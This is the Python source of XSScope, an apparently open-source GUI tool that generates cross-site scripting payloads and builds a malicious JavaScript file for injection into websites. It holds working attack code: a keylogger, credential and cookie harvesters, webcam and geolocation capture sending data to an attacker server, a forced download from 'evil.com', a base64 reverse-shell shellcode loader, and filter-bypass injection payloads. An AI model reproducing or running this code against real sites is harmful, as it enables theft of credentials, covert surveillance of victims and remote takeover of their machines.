#! /usr/bin/env python3
import shutil
import webbrowser  # just for help to redirect to github project page
from sys import platform  # avoid error(s) on unsupported commands
import requests
import io
import pyperclip  # to copy payloads into clipboard

import tkinter as tk
from tkinter import filedialog
from tkinter import *
from tkinter import ttk  # only required for the Loading Bar
import tkinter.messagebox

# libraries for server and xss generation such as base64
from pyngrok import ngrok
import base64
import os
from multiprocessing import Process

# license
about_software = '''XSScope is a XSS payload generator platform with an aim of increaing the impact of an XSS during Bug Hunting. Using all modules that XSScope offers, advanced XSS can be simply use with 1 click.
Note: The creator of this software is not responsible for any ilegal activity or any damage that this software might cause. Use it on your own risk!'''

license_description = '''Copyright (c) 2020 The Browser Pirates
    Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.
    The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose and noninfringement. In no event shall the authors or cypyright holders be liable for any claim, damages or other liability, whether in an action of contract, tort or otherwise, arising from, out of or in conection with the software or the use or other dealings in the software.'''


# functions start here
def quit():
    if "xsscope.js" in os.popen('ls').read():
        print("Deleting the temporary xsscope.js file.")
        os.remove("xsscope.js")
    elif "custom.js" in os.popen('ls').read():
        print("Deleting the temporary custom.js file.")
        os.remove("custom.js")
    tk.Tk().quit()


def documentation():
    global document_license
    tkinter.messagebox.showinfo("XSScope - Documentation & License", license_description)


def help():
    webbrowser.open("https://github.com/kleiton0x00/XSScope/wiki", new=1)


def about():
    tkinter.messagebox.showinfo("XSScope - About Software", about_software)


# customise + design of GUI
def agent_module():
    root1 = tk.Toplevel()
    root1.title("XSScope v2.2 - Customise your attack")
    root1.geometry('1045x360')
    # root1.iconbitmap('x_logo_VYw_icon.ico')
    root1.resizable(0, 0)

    global tcp_server, tcp_server_ip, tcp_server_port

    xss_keylogger_var = tk.IntVar()
    xss_screenshot_var = tk.IntVar()
    xss_xhr_harvester_var = tk.IntVar()
    xss_cookie_grabber_var = tk.IntVar()
    xss_changelinks_var = tk.IntVar()
    xss_changeimages_var = tk.IntVar()
    xss_clickjacker_var = tk.IntVar()
    xss_webcam_var = tk.IntVar()
    xss_net_shell_var = tk.IntVar()
    xss_force_download_var = tk.IntVar()
    xss_geolocation_var = tk.IntVar()

    def changelink_function():
        if xss_changelinks_var.get() == 1:
            changelinks_text.config(state="normal")
            changelinks_entry.config(state="normal")
            changelinks_entry.insert(END, 'https://github.com/kleiton0x00/XSScope/')
        elif xss_changelinks_var.get() == 0:
            changelinks_entry.delete(0, END)
            changelinks_text.config(state="disabled")
            changelinks_entry.config(state="disabled")

    def net_shell_function():
        if xss_net_shell_var.get() == 1:
            net_shell_exec_label.config(state="normal")
            net_shell_command.config(state="normal")
            net_shell_command.insert(END,
                                     '''/EiD5PDozAAAAEFRQVBSUUgx0lZlSItSYEiLUhhIi1IgSItyUE0xyUgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ESLQCBQi0gYSQHQ41ZNMclI/8lBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYSAHQQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcCgCASUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V''')
        elif xss_net_shell_var.get() == 0:
            net_shell_command.delete(0, END)
            net_shell_exec_label.config(state="disabled")
            net_shell_command.config(state="disabled")

    def force_download_function():
        if xss_force_download_var.get() == 1:
            force_download_label.config(state="normal")
            force_download_url.config(state="normal")
            force_download_url.insert(END, 'http://evil.com/virus.exe')
        elif xss_force_download_var.get() == 0:
            force_download_url.delete(0, END)
            force_download_label.config(state="disabled")
            force_download_url.config(state="disabled")

    def clickjack_function():
        if xss_clickjacker_var.get() == 1:
            URL_redirection_text.config(state="normal")
            URL_redirection.config(state="normal")
            URL_redirection.insert(END, 'https://github.com/kleiton0x00/XSScope/')
        elif xss_clickjacker_var.get() == 0:
            URL_redirection.delete(0, END)
            URL_redirection.config(state="disabled")
            URL_redirection_text.config(state="disabled")

    def refresh_webcam_status():
        if xss_webcam_var.get() == 1:
            xss_webcam_interval_text.configure(state="normal")
            xss_webcam_interval.config(state="normal")
            xss_webcam_interval.insert(END, '1500')
        elif xss_webcam_var.get() == 0:
            xss_webcam_interval.delete(0, END)
            xss_webcam_interval_text.configure(state="disabled")
            xss_webcam_interval.config(state="disabled")

    def image_loader():
        if xss_changeimages_var.get() == 1:
            image_URL_text.configure(state="normal")
            image_URL_loader.config(state="normal")
            image_URL_loader.insert(END,
                                    'https://camo.githubusercontent.com/82df4cf3df6cdb68bbc636c56baad4071b1349c4/68747470733a2f2f692e696d6775722e636f6d2f725352765578332e706e67')
        elif xss_changeimages_var.get() == 0:
            image_URL_loader.delete(0, END)
            image_URL_loader.config(state="disabled")
            image_URL_text.configure(state="disabled")

    def xss_build():
        global tcp_server, tcp_server_ip, tcp_server_port
        # defining the codes which will be added based on what user entered
        loading_bar['value'] = 0
        root1.update_idletasks()

        html_file = []

        # code for screenshot dynamically generated
        with open('config/screenshot.js') as screenshot_conf:
            screenshot_code = screenshot_conf.readlines()
            screenshot_code[5] = "var postDest = 'http://" + tcp_server + "/saveshot.php?png=';\n"

        with open('config/screenshot.js', "w") as screenshot_conf:
            screenshot_conf.writelines(screenshot_code)
            screenshot_conf.close()

        # defining the final .js code into the variable
        screenshot_conf_payload = str(open('config/screenshot.js', 'r').read())

        keylogger_code = '''document.onkeypress = function(evt) {
	evt = evt || window.event
	key = String.fromCharCode(evt.charCode)
	if (key) {
	   var http = new XMLHttpRequest();
	   var param = encodeURI(key)
	   http.open("POST", "http://''' + tcp_server + '''/retriever.php?xsscope="+param, true);
	   http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
	   http.send("xsscope="+param);
	}
}

'''

        net_shell_code = """import System;
import System.Runtime.InteropServices;
import System.Reflection;
import System.Reflection.Emit;
import System.Runtime;
import System.Text;

//C:\Windows\Microsoft.NET\Framework\v2.0.50727\jsc.exe Shellcode.js
//C:\Windows\Microsoft.NET\Framework\v4.0.30319\jsc.exe Shellcode.js

function InvokeWin32(dllName:String, returnType:Type,
  methodName:String, parameterTypes:Type[], parameters:Object[])
{
  // Begin to build the dynamic assembly
  var domain = AppDomain.CurrentDomain;
  var name = new System.Reflection.AssemblyName('PInvokeAssembly');
  var assembly = domain.DefineDynamicAssembly(name, AssemblyBuilderAccess.Run);
  var module = assembly.DefineDynamicModule('PInvokeModule');
  var type = module.DefineType('PInvokeType',TypeAttributes.Public + TypeAttributes.BeforeFieldInit);

  // Define the actual P/Invoke method
  var method = type.DefineMethod(methodName, MethodAttributes.Public + MethodAttributes.HideBySig + MethodAttributes.Static + MethodAttributes.PinvokeImpl, returnType, parameterTypes);

  // Apply the P/Invoke constructor
  var ctor = System.Runtime.InteropServices.DllImportAttribute.GetConstructor([Type.GetType("System.String")]);
  var attr = new System.Reflection.Emit.CustomAttributeBuilder(ctor, [dllName]);
  method.SetCustomAttribute(attr);

  // Create the temporary type, and invoke the method.
  var realType = type.CreateType();
  return realType.InvokeMember(methodName, BindingFlags.Public + BindingFlags.Static + BindingFlags.InvokeMethod, null, null, parameters);
}

function VirtualAlloc( lpStartAddr:UInt32, size:UInt32, flAllocationType:UInt32, flProtect:UInt32)
{
var parameterTypes:Type[] = [Type.GetType("System.UInt32"),Type.GetType("System.UInt32"),Type.GetType("System.UInt32"),Type.GetType("System.UInt32")];
var parameters:Object[] = [lpStartAddr, size, flAllocationType, flProtect];

return InvokeWin32("kernel32.dll", Type.GetType("System.IntPtr"), "VirtualAlloc", parameterTypes,  parameters );
}

function CreateThread( lpThreadAttributes:UInt32, dwStackSize:UInt32, lpStartAddress:IntPtr, param:IntPtr, dwCreationFlags:UInt32, lpThreadId:UInt32)
{
var parameterTypes:Type[] = [Type.GetType("System.UInt32"),Type.GetType("System.UInt32"),Type.GetType("System.IntPtr"),Type.GetType("System.IntPtr"), Type.GetType("System.UInt32"), Type.GetType("System.UInt32") ];
var parameters:Object[] = [lpThreadAttributes, dwStackSize, lpStartAddress, param, dwCreationFlags, lpThreadId ];

return InvokeWin32("kernel32.dll", Type.GetType("System.IntPtr"), "CreateThread", parameterTypes,  parameters );
}

function WaitForSingleObject( handle:IntPtr, dwMiliseconds:UInt32)
{
var parameterTypes:Type[] = [Type.GetType("System.IntPtr"),Type.GetType("System.UInt32")];
var parameters:Object[] = [handle, dwMiliseconds ];

return InvokeWin32("kernel32.dll", Type.GetType("System.IntPtr"), "WaitForSingleObject", parameterTypes,  parameters );
}

function ShellCodeExec()
{
var MEM_COMMIT:uint = 0x1000;
var PAGE_EXECUTE_READWRITE:uint = 0x40;

var shellcodestr:String = '""" + str(net_shell_command.get()) + """';
var shellcode:Byte[] = System.Convert.FromBase64String(shellcodestr);
var funcAddr:IntPtr = VirtualAlloc(0, UInt32(shellcode.Length),MEM_COMMIT, PAGE_EXECUTE_READWRITE);

Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);
var hThread:IntPtr = IntPtr.Zero;
var threadId:UInt32 = 0;
// prepare data
var pinfo:IntPtr = IntPtr.Zero;
// execute native code
hThread = CreateThread(0, 0, funcAddr, pinfo, 0, threadId);
WaitForSingleObject(hThread, 0xFFFFFFFF);

}

ShellCodeExec();

"""

        webcam_code = '''if (document.getElementById('webcamsnap') == null){ 

	 var v = document.createElement('video');
      v.autoplay=true;
	  v.id='vid';
	  v.style.display='none';
	  document.body.appendChild(v); 
     if (document.getElementById('canvas') == null) {
    var c = document.createElement('canvas');
    c.id = 'canvas';
    c.width = "480";
    c.height = "320";
    c.style.display = "none";
    document.body.appendChild(c);
}
var video = document.querySelector("#vid");
var canvas = document.querySelector('#canvas');
var ctx = canvas.getContext('2d');
var localMediaStream = null;
var onCameraFail = function (e) {
    console.log('Camera is not working.', e);
};
var xmlhttp=new XMLHttpRequest();

function snapshot() {
    if (localMediaStream) {
        ctx.drawImage(video, 0, 0, 480, 320);
        var dat = canvas.toDataURL('image/png');
        xmlhttp.open("POST", "http://''' + tcp_server + '''/webcam.php", true);
        xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    	var x=encodeURIComponent(dat);
        xmlhttp.send("data=" + x);

    }
    else {
        alert("Allow access to your default web camera.");
    }
    }

navigator.getUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia;
window.URL = window.URL || window.webkitURL;
navigator.getUserMedia({video:true}, function (stream) {
    video.srcObject = stream
    localMediaStream = stream;
    window.setInterval("snapshot()", ''' + str(xss_webcam_interval.get()) + ''');
}, onCameraFail);script = document.createElement('script');script.id = 'webcamsnap'; document.body.appendChild(script); }

'''

        xhr_harverster_code = '''username = document.forms[0].elements[0].value;
password = document.forms[0].elements[1].value;
window.setTimeout(function(){ 
var req = new XMLHttpRequest();
req.open("GET", "http://''' + tcp_server + '''/auth_retriever.php?username="+username+"&password="+password, true);
req.send();
} , 10000);

'''

        cookie_grabber_code = '''function InterceptForm() {
new Image().src = "http://''' + tcp_server + '''/cookie_grabber.php?sessionID="+" Browser: [" + navigator.appCodeName + "] Browser Version: [" + navigator.appVersion + "] Operating System: [" + navigator.platform + "] User Agent: [" + navigator.userAgent + "] Cookie: [" + document.cookie + "] Java Enabled: [" + navigator.javaEnabled + "] Pages viewed: [" + history.length + "] Color depth: [" + window.screen.colorDepth + "] Screen resolution: [" + screen.width + "x" + screen.height + "]";
}       
window.addEventListener("load", InterceptForm());

'''

        changelinks_code = '''var links = document.getElementsByTagName("a");
	for (i=0; i<links.length; i++)
	{
		links[i].href = "''' + str(changelinks_entry.get()) + '''";
		links[i].innerHTML = "Links Modified by Xsscope";
	}

'''

        changeimage_code = '''document.getElementsByTagName("img")[0].src = "''' + str(image_URL_loader.get()) + '''";

'''

        clickjacker_code = '''function catchClick () {
    location.href = "''' + str(URL_redirection.get()) + '''";
}   
document.body.addEventListener('click', catchClick, true);

'''

        geolocation_code = '''if (document.getElementById('xss_geoloc') == null){ 
function sendXHR(data)
{
        var xmlhttp= new XMLHttpRequest();
		xmlhttp.open("POST","http://''' + tcp_server + '''/retriever.php",true);
        xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
        xmlhttp.send("xsscope_geo="+data);
}
function showPosition(position) {

var map ='http://maps.googleapis.com/maps/api/staticmap?center='+ position.coords.latitude+','+position.coords.longitude+'&zoom=14&size=600x400&sensor=false';
sendXHR(encodeURIComponent(map));

}
if (navigator.geolocation) 
	{
        navigator.geolocation.getCurrentPosition(showPosition);
    } else 
	{ 
        sendXHR("Geolocation is not supported by this browser.");
    }

script = document.createElement('script');script.id = 'xss_geoloc'; document.body.appendChild(script); }

'''

        force_download_code = """var link = document.createElement('a');
link.href = '""" + str(force_download_url.get()) + """';
link.download = '';
document.body.appendChild(link);
link.click();

"""

        # start checking every checkbox and generating payload based on the user's preference
        try:
            if xss_keylogger_var.get() == 1:
                html_file.append(keylogger_code)
            else:
                pass
            if xss_screenshot_var.get() == 1:
                html_file.append(screenshot_conf_payload)
            else:
                pass
            if xss_xhr_harvester_var.get() == 1:
                html_file.append(xhr_harverster_code)
            else:
                pass
            if xss_cookie_grabber_var.get() == 1:
                html_file.append(cookie_grabber_code)
            else:
                pass
            if xss_changelinks_var.get() == 1:
                html_file.append(changelinks_code)
            else:
                pass
            if xss_changeimages_var.get() == 1:
                html_file.append(changeimage_code)
            else:
                pass
            if xss_clickjacker_var.get() == 1:
                html_file.append(clickjacker_code)
            else:
                pass
            if xss_webcam_var.get() == 1:
                html_file.append(webcam_code)
            else:
                pass
            if xss_geolocation_var.get() == 1:
                html_file.append(geolocation_code)
            else:
                pass
            if xss_force_download_var.get() == 1:
                html_file.append(force_download_code)
            else:
                pass
            if xss_net_shell_var.get() == 1:
                html_file.append(net_shell_code)
            else:
                pass

            # generating xsscope.js
            jsfile = open("xsscope.js", "w")
            for script_code in html_file:
                loading_bar['value'] = 26
                root1.update_idletasks()
                jsfile.write(script_code)

            jsfile.close()
            loading_bar['value'] = 100
            root1.update_idletasks()

        except:
            loading_bar['value'] = 100
            root1.update_idletas

    # xss module frame
    root2_frame = LabelFrame(root1, text="XSS Module Frame")
    root2_frame.place(x=5, y=5)

    xss_keylogger = tk.Checkbutton(root2_frame,
                                   text="Keyboard spying (active keylogger)                                                                         ",
                                   variable=xss_keylogger_var)
    xss_keylogger.grid(row=1, column=0)

    xss_screenshot = tk.Checkbutton(root2_frame,
                                    text="Take screenshot on victim's browser                                                                       ",
                                    variable=xss_screenshot_var)
    xss_screenshot.grid(row=2, column=0)

    xss_xhr_harvester = tk.Checkbutton(root2_frame,
                                       text="Get victim's saved credentials on the website                                                        ",
                                       variable=xss_xhr_harvester_var)
    xss_xhr_harvester.grid(row=4, column=0)

    xss_cookie_grabber = tk.Checkbutton(root2_frame,
                                        text="Gather victim information                                                                                        ",
                                        variable=xss_cookie_grabber_var)
    xss_cookie_grabber.grid(row=5, column=0)

    xss_webcam = tk.Checkbutton(root2_frame,
                                text="Persistent webcam hijacking (requires permission)                                                ",
                                variable=xss_webcam_var, command=refresh_webcam_status)
    xss_webcam.grid(row=6, column=0)

    xss_webcam_interval_text = tk.Label(root2_frame, text="Capture Interval (ms): ", state="disabled")
    xss_webcam_interval_text.grid(row=6, column=1)

    xss_webcam_interval = tk.Entry(root2_frame, width=10, state="disabled")
    xss_webcam_interval.grid(row=6, column=2)

    force_download = tk.Checkbutton(root2_frame,
                                    text="Force victim to download                                                                                         ",
                                    variable=xss_force_download_var, command=force_download_function)
    force_download.grid(row=7, column=0)

    force_download_label = tk.Label(root2_frame, text="URL of malicious file: ")
    force_download_label.grid(row=7, column=1)
    force_download_label.config(state="disabled")

    force_download_url = tk.Entry(root2_frame, width=40)
    force_download_url.grid(row=7, column=2)
    force_download_url.config(state="disabled")

    geolocation = tk.Checkbutton(root2_frame,
                                 text="Get real-time location                                                                                              ",
                                 variable=xss_geolocation_var)
    geolocation.grid(row=8, column=0)

    net_shell_exec = tk.Checkbutton(root2_frame,
                                    text="Execute .NET Shellcode (default: msfvenom base64 encoded reverse_tcp)          ",
                                    variable=xss_net_shell_var, command=net_shell_function)
    net_shell_exec.grid(row=9, column=0)

    net_shell_exec_label = tk.Label(root2_frame, text="Shell code command: ")
    net_shell_exec_label.grid(row=9, column=1)
    net_shell_exec_label.config(state="disabled")

    net_shell_command = tk.Entry(root2_frame,
                                 width=40)  # <script type="module"  src="http://2.tcp.ngrok.io:16429/NET_shell_exec.js"></script>
    net_shell_command.grid(row=9, column=2)
    net_shell_command.config(state="disabled")

    # -----------xss modules frames (for fun) inside the main module frame
    root3_frame = LabelFrame(root1, text="Fun Module Frame")
    root3_frame.place(x=5, y=215)

    xss_changelinks = tk.Checkbutton(root3_frame, text="Change every link in the website.         ",
                                     variable=xss_changelinks_var, command=changelink_function)
    xss_changelinks.grid(row=0, column=0)

    changelinks_text = tk.Label(root3_frame, text=" Replaced URL: ", state="disabled")
    changelinks_text.grid(row=0, column=1)

    changelinks_entry = tk.Entry(root3_frame, width=79, state="disabled")
    changelinks_entry.grid(row=0, column=2)

    xss_changeimages = tk.Checkbutton(root3_frame, text="Change every image in the website.     ",
                                      variable=xss_changeimages_var, command=image_loader)
    xss_changeimages.grid(row=1, column=0)

    image_URL_text = tk.Label(root3_frame, text=" Image URL: ", state="disabled")
    image_URL_text.grid(row=1, column=1)

    image_URL_loader = tk.Entry(root3_frame, width=79, state="disabled")
    image_URL_loader.grid(row=1, column=2)

    xss_clickjacker = tk.Checkbutton(root3_frame, text="Trolling clickjacker.                                ",
                                     variable=xss_clickjacker_var, command=clickjack_function)
    xss_clickjacker.grid(row=2, column=0)

    URL_redirection_text = tk.Label(root3_frame, text=" Redirect URL: ", state="disabled")
    URL_redirection_text.grid(row=2, column=1)

    URL_redirection = tk.Entry(root3_frame, width=79, state="disabled")
    URL_redirection.grid(row=2, column=2)

    # -------Output of the loading bar and button
    root5_frame = LabelFrame(root1, text="")
    root5_frame.place(x=5, y=315)

    loading_bar = ttk.Progressbar(root5_frame, orient=HORIZONTAL, length=885, mode='determinate')
    loading_bar.grid(row=0, column=0)

    build_payload_button = tk.Button(root5_frame, text="Build the payload", command=xss_build)
    build_payload_button.grid(row=0, column=1)

    root1.mainloop()


def check_update():
    version_file = open('config/version.txt', mode='r')
    old_version = float(version_file.read())
    version_file.close()

    version_request = requests.get("https://raw.githubusercontent.com/kleiton0x00/XSScope/master/config/version.txt")
    new_version = float(version_request.content)

    if old_version >= new_version:
        tkinter.messagebox.showinfo("Check for update", "No need to update, you are using the latest version.")
    if old_version < new_version:
        update = tkinter.messagebox.askquestion("Check for update", "There is a newer version, do you want to update?")
        if update == 'yes':
	    os.chdir("..")
	    shutil.rmtree('XSScope')
	    os.system("git clone https://github.com/kleiton0x00/XSScope.git")
	    tkinter.messagebox.showinfo("Successful update","Software successfuly updated, please restart the application.")

# functions of the main frame

def show_payload():
    root3 = tk.Toplevel()
    root3.title("XSScope v.2.2 - All XSS Payloads")
    root3.geometry('750x625')
    # root3.iconbitmap('x_logo_VYw_icon.ico')
    root3.resizable(0, 0)

    global tcp_server, tcp_server_ip, tcp_server_port

    main_frame10 = LabelFrame(root3, text="")
    main_frame10.place(x=5, y=0)

    def quit3():
        root3.destroy()

    # work on this function to copy payload in clipboard
    def copy_payload1():
        pyperclip.copy(payload1)

    def copy_payload2():
        pyperclip.copy(payload2)

    def copy_payload3():
        pyperclip.copy(payload3_final)

    def copy_payload4():
        pyperclip.copy(payload4)

    def copy_payload5():
        pyperclip.copy(payload5)

    def copy_payload6():
        pyperclip.copy(payload6)

    def copy_payload7():
        pyperclip.copy(payload7)

    def copy_payload8():
        pyperclip.copy(payload8)

    def copy_payload9():
        pyperclip.copy(payload9)

    def copy_payload10():
        pyperclip.copy(payload10_final)

    def copy_payload11():
        pyperclip.copy(payload11)

    # generating all XSS payloads

    payload3_script = 'var a=document.createElement("script");a.src="http://' + tcp_server + '/xsscope.js' + '";document.body.appendChild(a);'
    payload3_b64 = str(base64.b64encode(payload3_script.encode('utf-8')))
    payload3 = str(payload3_b64.split("b'")[1])
    payload3 = str(payload3[:-1])
    payload3 = str(payload3[:-2])
    cloudflare_bypass = "&Tab;"  # needed for payload 8

    payload1 = '<script src="http://' + tcp_server + '/xsscope.js"></script>'

    payload10_script = str(base64.b64encode(payload1.encode('utf-8')))
    payload10 = str(payload10_script.split("b'")[1])

    payload2 = """javascript:eval('var a=document.createElement(\'script\');a.src=\'http://""" + tcp_server + """/xsscope.js\';document.body.appendChild(a)')"""
    payload3_final = '"><input onfocus=eval(atob(this.id)) id=' + payload3 + '&#61;&#61; autofocus>'
    payload4 = '"><img src=x id=' + payload3 + '&#61;&#61; onerror=eval(atob(this.id))>'
    payload5 = '"><video><source onerror=eval(atob(this.id)) id=' + payload3 + '&#61;&#61;>'
    payload6 = '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//' + tcp_server + '/xsscope.js");a.send();</script>'
    payload7 = '<script>$.getScript("//' + tcp_server + '/xsscope.js")</script>'
    payload8 = "<iframe src=h" + cloudflare_bypass + "t" + cloudflare_bypass + "t" + cloudflare_bypass + "p" + cloudflare_bypass + ":" + cloudflare_bypass + "/" + cloudflare_bypass + "/" + cloudflare_bypass + \
               list(tcp_server)[0] + cloudflare_bypass + list(tcp_server)[1] + cloudflare_bypass + list(tcp_server)[
                   2] + cloudflare_bypass + list(tcp_server)[3] + cloudflare_bypass + list(tcp_server)[
                   4] + cloudflare_bypass + list(tcp_server)[5] + cloudflare_bypass + list(tcp_server)[
                   6] + cloudflare_bypass + list(tcp_server)[7] + cloudflare_bypass + list(tcp_server)[
                   8] + cloudflare_bypass + list(tcp_server)[9] + cloudflare_bypass + list(tcp_server)[
                   10] + cloudflare_bypass + list(tcp_server)[11] + cloudflare_bypass + list(tcp_server)[
                   12] + cloudflare_bypass + list(tcp_server)[13] + cloudflare_bypass + list(tcp_server)[
                   14] + cloudflare_bypass + list(tcp_server)[15] + cloudflare_bypass + list(tcp_server)[
                   16] + cloudflare_bypass + list(tcp_server)[17] + cloudflare_bypass + list(tcp_server)[
                   18] + cloudflare_bypass + list(tcp_server)[
                   19] + cloudflare_bypass + "/" + cloudflare_bypass + "x" + cloudflare_bypass + "s" + cloudflare_bypass + "s" + cloudflare_bypass + "c" + cloudflare_bypass + "o" + cloudflare_bypass + "p" + cloudflare_bypass + "e" + cloudflare_bypass + "." + cloudflare_bypass + "j" + cloudflare_bypass + "s" + cloudflare_bypass + "></iframe>"
    payload9 = '">' + str(payload1)
    payload10_final = "<svg/onload=eval(atob('" + payload10 + "))>"

    payload1_b64 = str(base64.b64encode(payload1.encode('utf-8')))
    payload1_b64 = str(payload1_b64.split("b'")[1])
    payload1_b64 = str(payload1_b64[:-1])
    payload11 = '<object data="data:text/html;base64,' + payload1_b64 + '"></object>'

    # save to intruder file
    intruder_content = payload1 + "\n" + payload2 + "\n" + payload3_final + "\n" + payload4 + "\n" + payload5 + "\n" + payload6 + "\n" + payload7 + "\n" + payload8 + "\n" + payload9 + "\n" + payload10_final + "\n" + payload11

    def directory_save():
        intruder = tkinter.filedialog.asksaveasfile(mode='w', defaultextension=".txt")
        if intruder is None:  # asksaveasfile return `None` if dialog closed with "cancel".
            return
        intruder.write(intruder_content)
        intruder.close()

    # customising the Tab for all payloads

    introduction_text = tk.Label(main_frame10,
                                 text="The following payloads are used for bug hunting. Those are XSS payloads with a high impact.")
    introduction_text.grid(row=0, column=0)

    main_frame11 = LabelFrame(root3, text="")
    main_frame11.place(x=5, y=40)

    payload1_text = tk.Label(main_frame11, text="Basic Tag Payload: ")
    payload1_text.grid(row=0, column=0)

    payload1_entry = tk.Entry(main_frame11, width=76)
    payload1_entry.insert(END, payload1)
    payload1_entry.grid(row=1, column=0)

    copy_payload1 = tk.Button(main_frame11, text="Copy payload", command=copy_payload1)  # add command
    copy_payload1.grid(row=1, column=1)

    payload2_text = tk.Label(main_frame11, text="URI Payload (Use where URI's are taken as input): ")
    payload2_text.grid(row=2, column=0)

    payload2_entry = tk.Entry(main_frame11, width=76)
    payload2_entry.insert(END, payload2)
    payload2_entry.grid(row=3, column=0)

    copy_payload2 = tk.Button(main_frame11, text="Copy payload", command=copy_payload2)  # add command
    copy_payload2.grid(row=3, column=1)

    payload3_text = tk.Label(main_frame11, text="Tag Payload (Bypassing Blacklist system): ")
    payload3_text.grid(row=4, column=0)

    payload3_entry = tk.Entry(main_frame11, width=76)
    payload3_entry.insert(END, payload3_final)
    payload3_entry.grid(row=5, column=0)

    copy_payload3 = tk.Button(main_frame11, text="Copy payload", command=copy_payload3)  # add command
    copy_payload3.grid(row=5, column=1)

    payload4_text = tk.Label(main_frame11, text="Tag Payload (Use when <script> tags are filtered): ")
    payload4_text.grid(row=6, column=0)

    payload4_entry = tk.Entry(main_frame11, width=76)
    payload4_entry.insert(END, payload4)
    payload4_entry.grid(row=7, column=0)

    copy_payload4 = tk.Button(main_frame11, text="Copy payload", command=copy_payload4)  # add command
    copy_payload4.grid(row=7, column=1)

    payload5_text = tk.Label(main_frame11, text="Tag Payload (HTML5 payload): ")
    payload5_text.grid(row=8, column=0)

    payload5_entry = tk.Entry(main_frame11, width=76)
    payload5_entry.insert(END, payload5)
    payload5_entry.grid(row=9, column=0)

    copy_payload5 = tk.Button(main_frame11, text="Copy payload", command=copy_payload5)  # add command
    copy_payload5.grid(row=9, column=1)

    payload6_text = tk.Label(main_frame11, text="Payload for exploitation of webapp with CSP: ")
    payload6_text.grid(row=10, column=0)

    payload6_entry = tk.Entry(main_frame11, width=76)
    payload6_entry.insert(END, payload6)
    payload6_entry.grid(row=11, column=0)

    copy_payload6 = tk.Button(main_frame11, text="Copy payload", command=copy_payload6)  # add command
    copy_payload6.grid(row=11, column=1)

    payload7_text = tk.Label(main_frame11, text="Payload for websites that include JQuery: ")
    payload7_text.grid(row=12, column=0)

    payload7_entry = tk.Entry(main_frame11, width=76)
    payload7_entry.insert(END, payload7)
    payload7_entry.grid(row=13, column=0)

    copy_payload7 = tk.Button(main_frame11, text="Copy payload", command=copy_payload7)  # add command
    copy_payload7.grid(row=13, column=1)

    payload8_text = tk.Label(main_frame11, text="Tag Payload (CloudFlare Bypassing): ")
    payload8_text.grid(row=14, column=0)

    payload8_entry = tk.Entry(main_frame11, width=76)
    payload8_entry.insert(END, payload8)
    payload8_entry.grid(row=15, column=0)

    copy_payload8 = tk.Button(main_frame11, text="Copy payload", command=copy_payload8)  # add command
    copy_payload8.grid(row=15, column=1)

    payload9_text = tk.Label(main_frame11, text="Tag Payload (AWS Bypassing): ")
    payload9_text.grid(row=16, column=0)

    payload9_entry = tk.Entry(main_frame11, width=76)
    payload9_entry.insert(END, payload9)
    payload9_entry.grid(row=17, column=0)

    copy_payload9 = tk.Button(main_frame11, text="Copy payload", command=copy_payload9)  # add command
    copy_payload9.grid(row=17, column=1)

    payload10_text = tk.Label(main_frame11, text="Base64-Encoded Payload: ")
    payload10_text.grid(row=18, column=0)

    payload10_entry = tk.Entry(main_frame11, width=76)
    payload10_entry.insert(END, payload10_final)
    payload10_entry.grid(row=19, column=0)

    copy_payload10 = tk.Button(main_frame11, text="Copy payload", command=copy_payload10)  # add command
    copy_payload10.grid(row=19, column=1)

    payload11_text = tk.Label(main_frame11, text="Tag payload which bypasses CSP if object-src and default-src are missing:")
    payload11_text.grid(row=20, column=0)

    payload11_entry = tk.Entry(main_frame11, width=76)
    payload11_entry.insert(END, payload11)
    payload11_entry.grid(row=21, column=0)

    copy_payload11 = tk.Button(main_frame11, text="Copy payload", command=copy_payload11)
    copy_payload11.grid(row=21, column=1)

    menubar1 = Menu(root3)
    filemenu1 = Menu(menubar1, tearoff=0)
    filemenu1.add_command(label="Save as a directory", command=directory_save)
    # filemenu1.add_separator()
    filemenu1.add_command(label="Exit", command=quit3)
    menubar1.add_cascade(label="Main", menu=filemenu1)

    root3.config(menu=menubar1)
    root3.mainloop()


def phishing_website():
    root4 = tk.Toplevel()
    root4.title("XSScope v.2.2 - Inject HTML Code")
    root4.geometry('1000x1000')
    root4.resizable(0, 0)
    # root4.iconbitmap('x_logo_VYw_icon.ico')

    global tcp_server, tcp_server_ip, tcp_server_port

    def quit4():
        root4.destroy()

    def add_html_code():
        html_payload_code = str(html_code.get("1.0", END))
        if html_payload_code == """
""":
            tkinter.messagebox.showerror("Error applying code", "Please add a code to the textbox.")
        else:
            pass

        # Convert String list to ascii values
        # using loop + ord()
        res = []
        for char in html_payload_code:
            res.extend(ord(num) for num in char)

        # converted string to ascii
        final_asci_code = str(res)

        # adding and removing strings to make it the final version to save to the file
